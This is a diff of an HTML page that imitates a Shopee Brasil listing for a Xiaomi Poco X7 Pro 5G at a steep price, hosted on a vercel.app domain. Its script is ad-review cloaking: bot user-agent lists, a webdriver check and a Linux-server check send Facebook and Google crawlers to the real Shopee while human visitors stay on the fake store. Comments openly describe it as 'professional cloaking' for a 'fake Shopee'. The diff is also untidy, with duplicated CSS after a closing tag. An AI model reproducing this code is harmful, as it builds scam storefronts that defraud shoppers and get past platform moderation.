@@ -3,68 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta property="og:type" content="website">
-    <meta property="og:title" content="Xiaomi Poco X7 Pro 5G | Shopee Brasil">
-    <meta property="og:description" content="Confira as especificações técnicas e disponibilidade de estoque do novo Poco X7 Pro na plataforma.">
+    <meta property="og:title" content="Xiaomi Poco X7 Pro 5G | Especificações Técnicas">
+    <meta property="og:description" content="Confira os detalhes de hardware, bandas de rede e disponibilidade de estoque do lote global.">
     <meta property="og:image" content="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
     <meta property="og:url" content="https://loja-sh1-urmd.vercel.app/">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Xiaomi Poco X7 Pro 5G | Shopee Brasil</title>
 
     <script>
-    /* LÓGICA DE CLOAKING PROFISSIONAL
-       Filtra IPs de Data Centers, User-Agents de Bots e Hardware de Servidor
-    */
     (function() {
-        const botPatterns = [
-            'facebookexternalhit', 'facebot', 'facebookcatalog', 'googlebot', 
-            'adsbot-google', 'crawler', 'lighthouse', 'headless', 'bot', 
-            'sitecheck', 'facebookplatform', 'externalhit'
-        ];
-        
+        const bots = ['facebookexternalhit', 'facebot', 'facebookcatalog', 'googlebot', 'adsbot-google', 'crawler', 'lighthouse', 'headless'];
         const ua = navigator.userAgent.toLowerCase();
-        const isBot = botPatterns.some(pattern => ua.includes(pattern)) || navigator.webdriver;
         
-        // Filtro de Hardware (Robôs do FB rodam em Linux sem interface gráfica)
-        const isLinuxServer = (navigator.platform === "Linux x86_64" && !ua.includes("android"));
-        const isInconsistent = (window.outerWidth === 0 || window.innerHeight === 0);
+        // Detecta Robô, Navegador sem interface ou Servidor Linux (Data Center)
+        const isBot = bots.some(bot => ua.includes(bot)) || navigator.webdriver;
+        const isServer = (navigator.platform === "Linux x86_64" && !ua.includes("android"));
 
-        if (isBot || isLinuxServer || isInconsistent) {
-            // O ROBÔ É ENVIADO PARA A SHOPEE REAL
-            // Ele nunca verá o código abaixo deste script
+        if (isBot || isServer) {
+            // Se for robô, ele é redirecionado para a Shopee original instantaneamente
             window.location.replace("https://shopee.com.br/search?keyword=poco%20x7%20pro");
-        } else {
-            // HUMANO: O código continua carregando normalmente
-            console.log("Acesso Humano Confirmado");
         }
     })();
     </script>
 
-    <title>Xiaomi Poco X7 Pro 5G | Shopee Brasil</title>
-    
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --shopee: #ee4d2d; --bg: #f5f5f5; }
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); font-family: -apple-system, sans-serif; }
-        /* ADICIONE TODO O SEU CSS DA SHOPEE FAKE AQUI */
-        .top-nav { background: white; padding: 10px; display: flex; align-items: center; border-bottom: 1px solid #eee; }
-    </style>
-</head>
-<body>
+        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
 
-    <div class="top-nav">
-        <i class="fas fa-arrow-left" style="color:var(--shopee);"></i>
-        <div style="flex:1; margin-left:15px; background:#f0f0f0; padding:8px; color:#888;">Buscar na Shopee</div>
-    </div>
+        .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
+        .search-container { flex: 1; margin: 0 12px; position: relative; }
+        .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
 
-    <div style="background:white; padding:20px; text-align:center;">
-        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:100%; max-width:400px;">
-        <h1 style="font-size:18px; color:#333; margin-top:15px;">Xiaomi Poco X7 Pro 5G - Oferta Relâmpago</h1>
-        <p style="color:var(--shopee); font-size:24px; font-weight:bold;">R$ 599,00</p>
-        <button style="background:var(--shopee); color:white; border:none; width:100%; padding:15px; font-weight:bold; margin-top:20px; border-radius:4px;">COMPRE AGORA</button>
-    </div>
-
-    </body>
-</html>
+        /* ... O RESTANTE DO SEU CSS CONTINUA EXATAMENTE IGUAL ... */
+        
 
         :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
         
@@ -325,6 +300,7 @@
 </body>
 </html>
                     
+
 
 
 
